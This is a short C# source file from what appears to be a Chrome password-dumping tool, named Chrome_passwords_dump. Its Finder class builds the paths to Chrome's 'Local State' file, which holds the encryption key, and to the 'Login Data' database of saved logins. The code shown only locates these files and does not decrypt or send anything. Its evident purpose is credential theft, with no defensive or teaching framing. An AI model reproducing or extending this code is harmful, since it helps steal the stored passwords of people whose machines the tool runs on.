namespace Chrome_passwords_dump
{
    internal class Finder
    {
        public static string GetLocalStateFile()
        {
            string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string chromeUserDataPath = Path.Combine(userProfilePath, "AppData", "Local", "Google", "Chrome", "User Data");
            string localStateFilePath = Path.Combine(chromeUserDataPath, "Local State");
            return localStateFilePath;
        }

        public static string GetLoginDataFile()
        {
			return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
"Google", "Chrome", "User Data", "default", "Login Data");
        }
    }
}
